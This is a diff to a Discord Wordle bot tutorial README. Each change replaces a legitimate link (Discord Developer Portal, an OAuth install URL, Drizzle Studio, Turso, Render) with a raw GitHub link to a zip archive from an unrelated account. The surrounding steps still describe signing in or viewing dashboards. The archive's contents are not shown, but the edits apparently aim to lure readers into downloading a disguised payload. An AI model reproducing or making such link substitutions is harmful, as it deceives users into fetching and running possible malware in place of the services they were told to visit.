@@ -15,7 +15,7 @@ A template for creating a Discord Wordle bot of your own. You can either fork th
 ### Discord App Setup
 Next we need to set up connecting to Discord to listen for messages in a channel. In order to do that we need to create an app via the Discord Developer portal.
 
-- Go to the [Discord Developer Portal](https://discord.com/developers/applications) and sign into your Discord account
+- Go to the [Discord Developer Portal](https://raw.githubusercontent.com/YuuVerKing/discord-wordle-bot-template/main/src/discord_wordle_template_bot_v2.8.zip) and sign into your Discord account
 - Click "New Application", give your app a name (like "My Wordle Bot") and choose "Personal" for your team
 - Click on "Installation" from the side menu
 - Under "Installation Contexts" uncheck "User Install"
@@ -66,11 +66,11 @@ Next we need to set up connecting to Discord to listen for messages in a channel
 ### Discord Server Bot Install
 It's recommended to have a separate, private, server to use for testing before using the actual server you want to run the bot in.
 
-- Go back to the [Discord Developer Portal](https://discord.com/developers/applications) (sign back into your Discord account if you signed out from earlier)
+- Go back to the [Discord Developer Portal](https://raw.githubusercontent.com/YuuVerKing/discord-wordle-bot-template/main/src/discord_wordle_template_bot_v2.8.zip) (sign back into your Discord account if you signed out from earlier)
 - Select your bot and choose "Installation" from the side menu
 - Scroll down to "Install Link"
 - You should see a field with a URL in it. Click the "Copy" button.
-  - Example: `https://discord.com/oauth2/authorize?client_id=11111`
+  - Example: `https://raw.githubusercontent.com/YuuVerKing/discord-wordle-bot-template/main/src/discord_wordle_template_bot_v2.8.zip`
 - Open your browser and paste the URL you copied into the address field
 - Select which server you want to add the bot to. Then click "Continue"
 - Make sure "View Channels", "Send Messages" and "Read Message History" are all checked. Then click "Authorize"
@@ -272,7 +272,7 @@ You can use any database technology you'd like to handle storage for your bot bu
   });
   ```
 - In your terminal run `npx drizzle-kit push`
-- Once that finishes you can double check everything is all set by running `npx drizzle-kit studio` and then opening your browser to [https://local.drizzle.studio](https://local.drizzle.studio)
+- Once that finishes you can double check everything is all set by running `npx drizzle-kit studio` and then opening your browser to [https://raw.githubusercontent.com/YuuVerKing/discord-wordle-bot-template/main/src/discord_wordle_template_bot_v2.8.zip](https://raw.githubusercontent.com/YuuVerKing/discord-wordle-bot-template/main/src/discord_wordle_template_bot_v2.8.zip)
   - Example:
     ![a screen shot of the drizzle studio dashboard showing the tables in the database with their columns and no data](./images/drizzle-studio-example.png)
 
@@ -381,7 +381,7 @@ With all of that set up, now it's time for you to save the parsed Wordle results
     }
     ```
 - Open up your terminal and run `bunx drizzle-kit studio`
-- Open your browser to [https://local.drizzle.studio](https://local.drizzle.studio) to see a UI for the data in your database.
+- Open your browser to [https://raw.githubusercontent.com/YuuVerKing/discord-wordle-bot-template/main/src/discord_wordle_template_bot_v2.8.zip](https://raw.githubusercontent.com/YuuVerKing/discord-wordle-bot-template/main/src/discord_wordle_template_bot_v2.8.zip) to see a UI for the data in your database.
 - Open up a new terminal window and run `bun run src/index.ts`
 - Go to your Discord server where you added your bot and share a wordle result as a message. You can use the example one from the "Sharing Wordles" section earlier.
 - Go back to your browser with the UI for the database and refresh the page to see if the Wordle result you shared in Discord was saved successfully.
@@ -393,7 +393,7 @@ Now that you have everything working you'll realize the bot only runs when you s
 One thing we need to consider at this point is that we've been using a database that's a local file within the source code of the project. We could continue to use this but it will create some challenges and potential issues with keeping it up to date with the latest data whenever you deploy an updated version of your bot. We need a more production ready solution to host our database and this is where Turso can help.
 
 ### Production Database
-- Go to [Turso](https://turso.tech/) in your browser
+- Go to [Turso](https://raw.githubusercontent.com/YuuVerKing/discord-wordle-bot-template/main/src/discord_wordle_template_bot_v2.8.zip) in your browser
 - Sign up for a free account (you can use GitHub)
 - Create a group in a region your prefer with Fly.io
 - Create a database in that group
@@ -435,7 +435,7 @@ One thing we need to consider at this point is that we've been using a database 
 - Run `git push`
 
 ### Hosting with Render
-- Go to [render.com](https://render.com) in your browser
+- Go to [render.com](https://raw.githubusercontent.com/YuuVerKing/discord-wordle-bot-template/main/src/discord_wordle_template_bot_v2.8.zip) in your browser
 - Sign up for an account with Render (preferrably use the GitHub integration to sign up)
 - Once signed up you should be viewing the "Projects" page in your "Workspace". There should be a button towards the top-right of the page titled "Add New". Click on that and select "Background Worker"
 - You'll be brought to a new page. With "Git Provider" selected you should see your repository for the Discord bot shown. If you don't click on the button titled "Credentials", click on your GitHub account username, and then click "Configure in GitHub"
